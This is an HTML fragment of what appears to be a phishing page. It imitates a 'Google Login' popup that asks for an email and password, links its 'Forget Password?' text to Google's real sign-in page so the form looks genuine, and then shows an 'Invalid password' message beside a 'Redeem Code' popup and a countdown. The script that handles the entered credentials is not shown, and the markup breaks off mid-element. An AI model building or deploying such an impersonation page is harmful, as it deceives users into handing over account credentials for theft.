    <div id="main-container">

    <!-- Google Login Popup -->
<div id="google-popup" class="popup">

        <h2>Google Login</h2>
        <div class="input-container">
            <input type="text" id="google-email" required>
            <label>Email</label>
            <ion-icon name="mail-outline"></ion-icon>
        </div>
        <div class="input-container">
            <input type="password" id="google-password" required>
            <label>Password</label>
            <ion-icon name="lock-closed-outline"></ion-icon>
        </div>
        <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://accounts.google.com/v3/signin/identifier%3Fdsh%3DS1812573153%253A1655944654029516%26flowEntry%3DServiceLogin%26flowName%3DWebLiteSignIn%26ifkv%3DAX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5&ved=2ahUKEwiDzYGu1oaIAxWpiK8BHQnkAt4QFnoECAYQAQ&usg=AOvVaw3wpeLZXIYauCgsekeJQCr6" class="forget-password">Forget Password?</a>
        <button onclick="googleLogin()" class="xbutt">Login</button>
    </div>
</div>

    <!-- Redeem Code Popup -->
    <div id="redeem-popup" class="popup">
        <div class="popup-content">
            <span class="xxxx">Invalid password</span>
            <div class="input-container">
                <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://accounts.google.com/v3/signin/identifier%3Fdsh%3DS1812573153%253A1655944654029516%26flowEntry%3DServiceLogin%26flowName%3DWebLiteSignIn%26ifkv%3DAX3vH39E0iYVTmn-NoMNM_C35EPrno8LWsRx2Qhr0HApkVLZ-Zc_Vql8ouaSQOiXzEmthrpOPAV5&ved=2ahUKEwiDzYGu1oaIAxWpiK8BHQnkAt4QFnoECAYQAQ&usg=AOvVaw3wpeLZXIYauCgsekeJQCr6"><h2 class="sexy"><u>forget password</u></h2></a>

    <div id="countdown-popup" class="popup">
        <div class="popup-content">
            <div id="countdown-circle">
